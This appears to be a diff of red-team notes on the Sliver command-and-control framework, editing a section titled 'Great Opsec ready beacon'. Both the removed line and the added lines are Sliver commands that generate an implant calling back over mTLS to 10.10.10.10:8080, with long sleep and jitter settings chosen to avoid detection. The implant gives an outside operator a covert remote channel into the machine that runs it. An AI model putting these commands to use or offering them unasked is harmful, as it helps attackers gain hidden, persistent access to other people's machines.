@@ -158,9 +158,9 @@ sliver > generate beacon --mtls 192.168.122.111 --os windows --arch amd64 --form
 
 ### Great Opsec ready beacon&#x20;
 
-```
-generate beacon -a amd64 -c google.com -f exe -J 300 -k 3000 --mtls 10.10.10.10:8080 --name main -o linux -j 1800 --save /opt/sliver/main -S 1800 -t 3600
-```
+<pre><code>generate beacon --seconds 1800 --jitter 300  --os linux --arch amd64 --format exe --mtls 10.10.10.10:8080 -k 10000 -t 3600 --name main --save /opt/sliver/main
+<strong>generate beacon -a amd64 -c google.com -f exe -J 300 -k 3000 --mtls 10.10.10.10:8080 --name main -o linux -j 1800 --save /opt/sliver/main -S 1800 -t 3600
+</strong></code></pre>
 
 ### Rename Session / Beacon&#x20;
 
